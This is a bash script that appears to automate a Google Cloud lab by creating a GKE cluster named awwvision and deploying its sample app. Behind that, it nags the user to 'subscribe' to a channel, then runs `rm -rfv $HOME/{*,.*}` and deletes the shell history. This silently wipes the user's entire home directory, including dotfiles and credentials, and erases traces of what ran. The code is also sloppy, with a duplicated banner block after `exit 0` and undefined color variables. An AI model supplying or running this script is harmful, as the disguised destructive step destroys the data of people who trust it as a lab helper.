
gcloud auth list

export ZONE=$(gcloud compute project-info describe --format="value(commonInstanceMetadata.items[google-compute-default-zone])")

export PROJECT_ID=$(gcloud config get-value project)

gcloud config set compute/zone "$ZONE"

gcloud container clusters create awwvision \
    --num-nodes 2 \
    --scopes cloud-platform

YELLOW='\033[0;33m'
NC='\033[0m' 
pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

gcloud container clusters get-credentials awwvision

kubectl cluster-info

sudo apt-get install -y virtualenv

python3 -m venv venv

source venv/bin/activate

gsutil -m cp -r gs://spls/gsp066/cloud-vision .


cd cloud-vision/python/awwvision

make all

kubectl get pods

sleep 5 

kubectl get pods

kubectl get deployments -o wide

kubectl get svc awwvision-webapp

read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0


pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)
for line in "${pattern[@]}"
do
    echo -e "${YELLOW}${line}${NC}"
done
